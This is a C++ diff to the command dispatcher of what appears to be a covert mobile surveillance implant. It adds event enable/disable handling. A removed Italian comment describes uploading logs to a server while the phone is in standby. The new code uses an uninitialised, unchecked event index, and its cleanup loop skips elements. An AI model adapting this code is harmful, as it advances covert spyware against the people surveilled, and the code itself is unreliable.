@@ -41,6 +41,8 @@ CCore* CCore::NewLC()
 CCore::~CCore()
 	{
 	__FLOG(_L("Destructor"));
+	iEvents.ResetAndDestroy();
+	iEvents.Close();
 	iEndPoints.ResetAndDestroy();
 	iEndPoints.Close();
 	delete iConfig;
@@ -194,6 +196,7 @@ void CCore::StopAllAgentsAndEventsL()
 		}
 
 	// Disposes all the Events...
+	/*
 	int i = 0;
 	while (i < iEndPoints.Count())
 		{
@@ -203,6 +206,14 @@ void CCore::StopAllAgentsAndEventsL()
 			iEndPoints.Remove(i);
 			continue;
 			}
+		i++;
+		}
+		*/
+	TInt i = 0;
+	while(i < iEvents.Count())
+		{
+		delete iEvents[i];
+		iEvents.Remove(i);
 		i++;
 		}
 	}
@@ -258,7 +269,8 @@ void CCore::LoadConfigAndStartL()
 		CDataEvent* dataEvent = iConfig->iEventsList[i];
 		CAbstractEvent* newEvent = EventFactory::CreateEventL(dataEvent->iId, dataEvent->iParams,
 				dataEvent->iMacroActionIdx);
-		iEndPoints.Append(newEvent);
+		//iEndPoints.Append(newEvent);
+		iEvents.Append(newEvent);
 		}
 	__FLOG(_L("LoadConfigAndStartL() exit"));
 	}
@@ -269,6 +281,8 @@ void CCore::LoadNewConfigL()
 		_LIT(KNewConf,"New configuration received");
 		LogInfoMsgL(KNewConf);
 		
+		// clear events
+		iEvents.ResetAndDestroy();
 		// clear iEndPoints
 		iEndPoints.ResetAndDestroy();
 		
@@ -392,18 +406,6 @@ void CCore::ExecuteActionL(TInt aQueueId,TActionType type, const TDesC8& params)
 
 	if (type == EAction_Sync || type == EAction_SyncApn)
 		{
-		/*
-		 // 1. Restarta gli agenti che creano un log unico in append in modo da poter inviare il log scritto fino al momento.
-		 // 2. Restarta il DeviceAgent?.
-		 // 3. Controlla che non sia gia' disponibile una connessione (WiFi? ad esempio).
-		 // 1. Se disponibile allora inizia il processo di sincronizzazione. 
-			4. Controlla lo stato del device per verificare che si trovi in stand-by.
-			5. Se il device e' in standby viene creato uno snapshot dei log attualmente disponibili.
-			6. Viene stabilita una connessione col server.
-			7. Viene richiesto il file di configurazione.
-			8. Vengono inviati i log.
-			9. L'Azione termina e viene ristabilito lo stato precedente (es: vengono spente le periferiche che erano state accese).
-		 */
 		//RestartAllAgentsL();  // original MB
 		CycleAppendingAgentsL();
 		}
@@ -447,9 +449,10 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 		{
 		CDataAction* action = macroAction->iActionsList[i];
 
-		// Handles the two special cases Start Agent / Stop Agent because we have to check 
+		// Handles the special cases Start Agent / Stop Agent because we have to check 
 		// if the Agent is already running and stop it, or create a new Agent and start it.
 		// EAction_StartAgent and EAction_StopAgent are not "real" Actions objects, they just start or stop Agents
+		// Handles also the special cases enable event / disable event
 		switch (action->iId)
 			{
 			case EAction_StartAgent:
@@ -486,10 +489,6 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 				}
 			case EAction_StopAgent:
 				{
-				// Handles the two special cases Start Agent / Stop Agent because we have to check 
-				// if the Agent is already running and stop it, or create a new Agent and start it.
-				//TUint32* paramsPtr = (TUint32*) action->iParams.Ptr();
-				//TAgentType agentId = (TAgentType) *paramsPtr;
 				TAgentType agentId;
 				RBuf paramsBuf;
 				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
@@ -520,6 +519,74 @@ void CCore::DispatchCommandL(TCmdStruct aCommand)
 					StopAgentL(queueId,agentId);
 				break;
 				}
+			case EAction_EnableEvent:
+				{
+				TInt orderId;
+				
+				RBuf paramsBuf;
+				TInt err = paramsBuf.Create(2*(action->iParams.Size()));
+				if(err == KErrNone)
+					{
+					paramsBuf.Copy(action->iParams);
+					}
+				else
+					{
+					//TODO: not enough memory
+					}
+																
+				paramsBuf.CleanupClosePushL();
+				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+				CleanupStack::PushL(jsonBuilder);
+				jsonBuilder->BuildFromJsonStringL(paramsBuf);
+				CJsonObject* rootObject;
+				jsonBuilder->GetDocumentObject(rootObject);
+				if(rootObject)
+					{
+					CleanupStack::PushL(rootObject);
+					rootObject->GetIntL(_L("event"),orderId);
+					CleanupStack::PopAndDestroy(rootObject);
+					}
+				CleanupStack::PopAndDestroy(jsonBuilder);
+				CleanupStack::PopAndDestroy(&paramsBuf);
+				
+				if(!(iEvents[orderId]->Enabled()))
+					iEvents[orderId]->StartEventL();
+				}
+				break;
+			case EAction_DisableEvent:
+				{
+				TInt orderId;
+								
+				RBuf paramsBuf;
+			    TInt err = paramsBuf.Create(2*(action->iParams.Size()));
+				if(err == KErrNone)
+					{
+					paramsBuf.Copy(action->iParams);
+					}
+				else
+					{
+					//TODO: not enough memory
+					}
+																				
+				paramsBuf.CleanupClosePushL();
+				CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+				CleanupStack::PushL(jsonBuilder);
+				jsonBuilder->BuildFromJsonStringL(paramsBuf);
+				CJsonObject* rootObject;
+				jsonBuilder->GetDocumentObject(rootObject);
+				if(rootObject)
+					{
+					CleanupStack::PushL(rootObject);
+					rootObject->GetIntL(_L("event"),orderId);
+					CleanupStack::PopAndDestroy(rootObject);
+					}
+				CleanupStack::PopAndDestroy(jsonBuilder);
+				CleanupStack::PopAndDestroy(&paramsBuf);
+								
+				if((iEvents[orderId]->Enabled()))
+					iEvents[orderId]->StopEventL();
+				}
+				break;
 			default:
 				// All others are real Actions, so creates new Actions instances and send them a START commmand
 				ExecuteActionL(queueId,action->iId, action->iParams);
